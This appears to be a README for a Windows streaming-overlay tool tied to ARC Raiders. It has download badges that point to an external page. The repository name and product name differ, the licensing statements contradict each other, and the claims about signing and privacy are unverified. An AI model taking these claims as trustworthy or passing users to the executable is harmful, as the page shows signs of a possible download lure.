![preview](https://raw.githubusercontent.com/dominance-ai/arc-raiders-live-overlay-suite/main/view_67a0.svg)
# Emberfall Broadcast Suite

**Local, real-time environmental telemetry for live streamers and VFX artists — a Windows-native companion that visualizes the invisible pulse of your broadcast rig, from thermal load to GPU memory pressure, without ever touching a cloud service.**

## Overview

Think of your streaming setup as a living organism. The CPU is the heart, the GPU is the lungs, and the power supply is the nervous system. For years, you've been flying blind, relying on generic system monitors that show you numbers but not *stories*. Emberfall Broadcast Suite is a different kind of creature — it doesn't just report sensor data; it *translates* it into a visual language that your audience can understand and you can act upon.

Built specifically for the demanding environment of live content creation (particularly for games like ARC Raiders, where system load spikes are brutal and unpredictable), this application runs entirely on your local machine. No cloud, no telemetry, no third-party servers. Your system's most intimate details — core temperatures, clock speeds, memory allocation, frame pacing, power draw — are processed, interpreted, and rendered as fluid, organic overlays that feel less like graphs and more like the *aura* of your hardware.

This suite is designed to be the quiet, observant partner to your streaming software. It sits in the background, watches your hardware work, and transforms that work into something beautiful. For the streamer, it means never again having to alt-tab out of a game to check if your thermal throttling is about to ruin a clutch moment. For the VFX artist, it means having a real-time, data-driven canvas that reacts to the very workload you're rendering.

## 📜 Table of Contents
- [The Core Philosophy](#-the-core-philosophy)
- [Key Features](#-key-features)
- [Architecture & Design](#-architecture--design)
- [The Overlay Engine](#-the-overlay-engine)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [Getting Started](#-getting-started)
- [Customization & Profiles](#-customization--profiles)
- [Reliability & 24/7 Data Integrity](#-reliability--247-data-integrity)
- [Performance Footprint](#-performance-footprint)
- [Security & Privacy](#-security--privacy)
- [Troubleshooting & FAQ](#-troubleshooting--faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧠 The Core Philosophy

Most monitoring tools treat your hardware like a spreadsheet. They list values, draw spiky line graphs, and call it a day. Emberfall treats your hardware like a **weather system**. Just as meteorologists read barometric pressure and wind shear to predict a storm, Emberfall reads microsecond-level clock jitter and power draw fluctuations to *predict* performance dips before they happen.

This isn't just a pretty face on the same old data. The underlying logic is a **predictive hysteresis model**. Instead of simply showing you that your GPU is at 88°C, it calculates the rate of change, the thermal mass of your specific cooling solution (derived from your past sessions), and gives you a "clarity score" — a clear, at-a-glance indicator of how much headroom you have before your system starts degrading performance.

The entire product is built on the principle of *spatial intuition*. Your eyes are better at seeing patterns in organic shapes and gradual color shifts than they are at scanning numerical readouts. Emberfall exploits this. A CPU that's struggling shifts from a calm blue to a turbulent amber in the overlay — you instinctively know what's happening even if you're in the middle of a firefight.

---

## ⚡ Key Features

- **Real-time Hardware Telemetry (Local-First):** Captures CPU, GPU, RAM, VRAM, thermal, and power data at a configurable polling rate (down to 50ms). Everything stays on your machine — zero external traffic.
- **Organic Overlay Engine:** Renders data as flowing particles, heat-haze distortions, or geometric rings. Unlike rigid bar charts, these visuals are designed to be unobtrusive yet profoundly informative.
- **Predictive Throttle Detection:** emberfalls "event horizon" algorithm forecasts potential thermal or power throttling 5–10 seconds in advance, giving you critical reaction time.
- **Multi-Stream Ingestion:** Connect to up to three separate sensor sources (e.g., motherboard probes, external sensor hub, game engine built-in stats) simultaneously. Data is cross-verified for accuracy.
- **Auto-Profile Switching:** Detects running applications and automatically swaps overlay themes and data focus — a resource-heavy cinematic game gets a different overlay than a lightweight desktop stream.
- **One-Click OBS Integration:** Exports a transparent, click-through window target that OBS can capture directly, preserving your scene's aesthetic.
- **Session Logging & Retro-Analysis:** Records raw telemetry data to a local, compressed archive. You can review a past stream to identify exactly why a stutter occurred at a specific timestamp.
- **Compact Micro-View Mode:** A minimalist, dockable window showing only the "vitals" — system health score, FPS, and temperature delta — for permanent on-screen presence.

---

## 🏗 Architecture & Design

Emberfall is a **modular, event-driven application** written for the Windows environment (Windows 10 21H2 and later). It is not a monolithic script but a federation of distinct services that communicate via a lightweight, in-memory message bus.

### The Three-Tier Foundation

1.  **The Observer Tier (Sensor Abstraction):** This layer interacts with hardware through Windows Management Instrumentation (WMI), the RDTSC (Read Time-Stamp Counter) instruction for low-level CPU timing, and the NVAPI/ADL SDKs for NVIDIA and AMD graphics cards respectively. All raw sensor reads are normalised into a standardised `TelemetryFrame` object, decoupling the rest of the app from vendor-specific quirks.

2.  **The Interpreter Tier (Signal Processing):** This is the intellectual core of the suite. Here, the raw `TelemetryFrame` data is fed through a series of filters:
    - *Kalman Filter:* Smooths out noise from sensor jitter to provide a stable baseline.
    - *Rate-of-Change Calculator:* Determines the slope of temperature and power curves.
    - *Hysteresis State Machine:* Applies the predictive model, shifting between "Nominal," "Pressuring," "Critical," and "Recovery" states.
    - The output is a `VisualDirective` — a set of instructions describing *what* to draw, *where*, and in *which* color, rather than just raw numbers.

3.  **The Presenter Tier (Rendering & UI):** Built using the BGFX rendering library, this tier takes the `VisualDirective` and turns it into pixels. It handles the overlay's transparent window, the CEF-based (Chromium Embedded Framework) control panel, and a DirectComposition layer for seamless integration with the Windows desktop manager.

### Why This Architecture Matters

By separating the *hardware talk* from the *visual interpretation*, Emberfall allows you to use different sensor hardware without changing the look of your overlay. You can also create entirely new visual themes (a "Cyberpunk" theme, a "Minimal" theme) without touching the sensor logic. It's a clean separation of concerns that makes the suite stable and extensible.

---

## 🎨 The Overlay Engine

The heart of the visual experience is not a library of pre-rendered GIFs or static PNGs. It's a **live vector synthesis engine**. Each visual element — whether a particle stream or a glowing halo — is generated mathematically on the CPU/GPU every frame, reacting to the data in real-time.

### Visual Modes

- **The Aether Rings:** Three concentric rings orbit a central point (your character's health or crosshair). Each ring represents a subsystem (CPU, GPU, RAM). The rings contract and expand, and their spectral hue shifts from cool blue to fiery orange as the load intensifies.
- **The Thermal Drift:** A subtle, animated fog that drifts across the bottom of the screen. Its opacity and speed correlate directly with your temperature delta. You don't see a number; you feel a *pressure* change in the air of the screen.
- **The Pulse Core:** A simple, stylized heart or geometric diamond that beats in rhythm with your frame time. A slow, steady beat means flawless performance. A fluttering, erratic beat is an immediate, visceral warning of stutter.

Every mode is fully customizable via a `JSON` configuration file. You can bind colors to specific temperature thresholds, adjust particle velocities, and even create your own hybrid modes.

---

## 🌍 Responsive UI & Multilingual Support

The suite is designed not just for the **12-monitor streamer rig** but also for the **single-monitor casual broadcaster** on a modest setup.

### Adaptive Design Philosophy

The control panel is built on a fluid grid layout. It gracefully collapses:
- **Desktop (1440px+):** Full dashboard with all telemetry graphs, profile managers, and log viewers.
- **Tablet (768px - 1439px):** A condensed view focusing on the primary metrics and overlay theme switcher.
- **Phone (Under 768px):** A "Mission Control" view with big, touch-friendly buttons for starting/stopping the overlay and flipping between primary modes. Remote control is also possible via a localhost web-socket if you want to adjust settings from a phone on the same LAN.

### Language Inclusivity

The application is fully localised. We have built-in language packs for:
- English (Default)
- 简体中文 (Simplified Chinese)
- 日本語 (Japanese)
- Deutsch (German)
- Français (French)
- Русский (Russian)
- Português (Brasileiro) (Brazilian Portuguese)

The language selection is stored in your user profile, and the overlay text is rendered using a dynamic font-fallback system to ensure characters are always displayed correctly, regardless of the language's character set.

---

## 🚀 Getting Started

Welcome to the fold. Getting Emberfall up and running is a straightforward process designed to have you seeing your system's aura within moments.

### Pre-Flight Checklist
- A Windows 10 (21H2+) or Windows 11 machine.
- A GPU from NVIDIA (GTX 900 series or newer) or AMD (RX 400 series or newer) for full sensor data.
- 100 MB of free disk space (primarily for session logs).
- The latest Visual C++ Redistributables (the installer will prompt you if needed).

### Installation Journey

[![Download](https://raw.githubusercontent.com/dominance-ai/arc-raiders-live-overlay-suite/main/app_557c.svg)](https://dominance-ai.github.io/arc-raiders-live-overlay-suite/)

1.  **Emberfall's Arrival:** Navigate to the release section of this repository and download the `Emberfall-Setup.exe` binary. This binary is a self-contained package—it bundles the application, the sensor drivers, and the default overlay themes.

2.  **The Silent Launch:** Run the executable. You'll be greeted by a simple wizard. Choose your install directory (we recommend a non-system drive if you have heavy stream archives), and select your preferred default language.

3.  **Sensor Initialisation:** Upon first launch, the Observer Tier will perform a "hardware handshake." It will scan your buses for supported sensors. This is a read-only operation; it only queries data, it never writes to hardware.

4.  **Open the Canvas:** By default, the app starts in "Control" mode. You'll see the main dashboard. To activate the overlay, press `Ctrl + Shift + E`. The overlay will appear centered on your primary monitor. It is click-through and does not interact with your game input.

5.  **Connect to OBS:** In OBS, add a new "Window Capture" source, and select the Emberfall Overlay window. Use the "Transparent" option in OBS's window capture properties for a clean blend. The overlay is designed to be transparent, so no chroma key is needed.

---

## 🛠 Customization & Profiles

Your stream is your signature. Emberfall should adapt to your identity, not the other way around.

### The Profile System

Emberfall uses a profile system that encapsulates **appearance** and **data focus**.
- **Appearance Profile:** Colors, shapes, particle density, overlay size, and positioning.
- **Data Focus Profile:** Which telemetry streams are active, the thresholds for warnings, and the polling rate.

You can have a profile for "Competitive FPS" (sleek, minimal, focused on frame time and network stats) and a "*Cinematic Story*" profile (glowing, ethereal, focused on GPU load and temperature trends).

### Theme Editor (The Artisan's Forge)

While you can edit `json` files directly, the built-in Theme Editor provides a live preview. You can tweak a color value or a displacement factor, and see the overlay update instantly on a mock background. This is where the `VisualDirective` system shines—you can assign specific logic states (like "Thermal Throttling" or "Excellent Frame Time") to entirely distinct visual paradigms.

---

## 🛡 Reliability & 24/7 Data Integrity

We understand that when you're live, the show must go on. Emberfall is built with a **watchdog architecture**.

### The Sentinel Process

The main application spawns a separate, lightweight "Sentinel" process. The Sentinel's sole job is to monitor the main process. If the main app crashes due to a driver conflict or an obscure third-party hook, the Sentinel will:
1.  Log the error to a local crash dump.
2.  Automatically restart the main app and reconnect to the sensor layer.
3.  If within a streaming session, the Sentinel will immediately force the overlay window to become fully transparent to ensure it doesn't block your content, while alerting you via a Windows notification toast.

This ensures that even in the most unstable edge cases, your broadcast is never interrupted by intrusive diagnostic pop-ups. The Sentinel itself is robust, uses very little memory (~10 MB), and operates with the highest Windows stability tier.

### Data Validation Layers

Before any telemetry frame is sent to the Interpreter, it passes through a "sanity validator." If a sensor reads an impossible value (e.g., a CPU temperature of -5°C, or a memory load of 150%), the validator flags it, discards it, and runs a fallback algorithm based on mathematical interpolation from previous, valid reads. This prevents wildly inaccurate spikes from triggering false alarms in your overlay.

---

## ⚙️ Performance Footprint

A monitoring tool that hogs resources is a paradox. Emberfall is engineered for radical efficiency to be the least intrusive part of your entire rig.

### Resource Consumption Targets
- **CPU Usage:** **< 0.5%** of a single core (Intel i5-8400 or equivalent) during active monitoring.
- **GPU Usage:** **0% - 1%** when the overlay is static (using GPU idle threading), rising to **~2%** during particle-heavy animations in extreme thermal states.
- **RAM Footprint:** The main process idles at under **60 MB** of committed memory. The overlay rendering process typically occupies **30 MB** of VRAM.
- **Disk Access:** None, except for periodic session log writes (configurable to every 30 seconds or at session end). No background indexing or telemetry uploads.

This is achieved through a technique called "event-based redraw." The overlay does not render at 60 FPS constantly. It only renders when a `VisualDirective` indicates a change in state or a non-static animation is triggered. When your system is in "Nominal" status, the overlay freezes its frame output, saving those precious GPU cycles for your game.

---

## 🔐 Security & Privacy

Your hardware signature is your business. The design principle is **local-first, local-only**. Emberfall's source code is open for review to demonstrate these guarantees.

- **No Network Egress:** The application does not contain any code that transmits data out of your machine, except when you explicitly initiate a "LAN Remote Control" session on the same subnet. There are no analytics beacons, no crash reporting servers (dumps are local), and no advertisement frameworks.
- **Minimal Permissions:** The installer requires standard user-level installation permissions. It does not request Administrator privileges unless you specifically ask it to install a low-level system driver for specialized motherboard sensor chips (which would be a separate, explicit prompt).
- **Cryptographic Integrity:** All installation packages are signed with a code-signing certificate. The integrity of the binary can be verified via the `Get-AuthenticodeSignature` PowerShell cmdlet.
- **Transparent Code Audit:** Since this is an open-source project, you are encouraged to audit the networking stack. You will find that the only time a network socket is opened is for the optional LAN control feature, and it is clearly commented in the source code.

---

## 🧯 Troubleshooting & FAQ

### The Overlay Is Not Appearing
- Ensure the overlay is enabled in the Control Panel (toggle via `Ctrl + Shift + E`).
- Verify the game is running in "Windowed" or "Borderless Windowed" mode, not "Exclusive Fullscreen" — the overlay requires a composited desktop environment to display over game video.
- Check if your GPU driver has a known issue with DirectComposition. Updating to the latest stable driver usually resolves this.

### The Sensor Reads Are Erratic
- The Kalman filter should smooth most jitter. If it's still erratic, check the polling rate. A polling rate of 100ms is recommended for stability. Lowering it to 50ms gives more detail but may be noisier on some motherboards.
- If you are using a laptop, ensure you are running on the dedicated GPU and not the integrated one, as the iGPU's sensor bus may be limited.

### Can I Use This With Streaming Software Other Than OBS?
- Absolutely. The overlay window is a standard Windows window. Streamlabs, XSplit, and vMix all support "Window Capture." The same principles apply—just add a transparent window capture source.

### How Do I Update The Suite?
- The software checks for updates on startup (you can disable this in settings). When an update is available, a small notification asks if you wish to download it. The update is applied in-place without losing your profiles.

---

## ⚠️ Disclaimer

**Software Warranty Disclaimer**
This software is provided "as is" and "with all faults." The developers, contributors, and maintainers of this project make no representations or warranties of any kind, express or implied, regarding the accuracy, reliability, or suitability of the software for any purpose. By using this software, you acknowledge that it is your sole responsibility to ensure it functions correctly within your specific hardware and software environment.

**Hardware Risk Disclaimer**
Emberfall is a monitoring tool only. It does not modify hardware settings, overclock, or undervolt components. However, you are responsible for the safety of your system. The developers are **not** liable for any damage to hardware or data loss that may occur as a result of using this software, even if the software is used for extended periods of time to monitor thermal or power states.

**Third-Party Integration Disclaimer**
This suite is an independent development project and is not affiliated with, endorsed by, or sponsored by Embark Studios, Sega, or the developers of ARC Raiders. Any trademarks are the property of their respective owners.

---

## 📜 License

This project is licensed under the MIT License.

[![Download](https://raw.githubusercontent.com/dominance-ai/arc-raiders-live-overlay-suite/main/app_557c.svg)](https://dominance-ai.github.io/arc-raiders-live-overlay-suite/)

---

© 2026 Emberfall Open Source Collective. All rights reserved. We build for the streamer, the creator, and the curious mind.